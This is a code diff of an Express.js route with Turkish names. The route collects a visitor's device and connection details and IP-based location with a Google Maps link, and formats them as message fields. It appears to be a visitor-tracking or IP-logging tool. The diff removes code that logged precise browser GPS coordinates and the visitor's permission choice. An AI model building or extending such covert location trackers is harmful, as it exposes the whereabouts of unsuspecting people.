@@ -166,7 +166,7 @@ function sanitize(s) {
 }
 
 app.get('/', async (req, res, next) => {
-  if (!req.query.geo && !req.query.device) {
+  if (!req.query.device && !req.query.conn) {
     return next();
   }
   try {
@@ -191,22 +191,10 @@ app.get('/', async (req, res, next) => {
     const eksKonum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
     let mapsLink = '';
     let konum = flag+' '+eksKonum;
-    let geoDurum = '';
-    if (req.query.geo === 'izin_verdi') {
-      const lat = sanitize(req.query.lat || '');
-      const lon = sanitize(req.query.lon || '');
-      if (lat && lon) mapsLink = 'https://www.google.com/maps?q='+lat+','+lon;
-      let acc = req.query.acc ? ' (±'+sanitize(req.query.acc)+'m)' : '';
-      konum = flag+' '+eksKonum+'\n:crosshairs: Kesin konum:\n[Haritada göster]('+mapsLink+')'+acc;
-      geoDurum = 'Konuma izin verdi :white_check_mark:';
-    } else if (req.query.geo === 'izin_vermedi') {
-      geoDurum = 'Konuma izin vermedi :no_entry:';
-    } else if (geo.lat) {
+    if (geo.lat) {
       mapsLink = 'https://www.google.com/maps?q='+geo.lat+','+geo.lon;
       konum = flag+' '+eksKonum+'\n[Haritada göster]('+mapsLink+')';
-      geoDurum = 'IP bazlı konum';
     }
-    if (geoDurum) konum += '\n_'+geoDurum+'_';
     const now = new Date();
     const fields = [
       { name: ':round_pushpin: Konum', value: konum, inline: true },
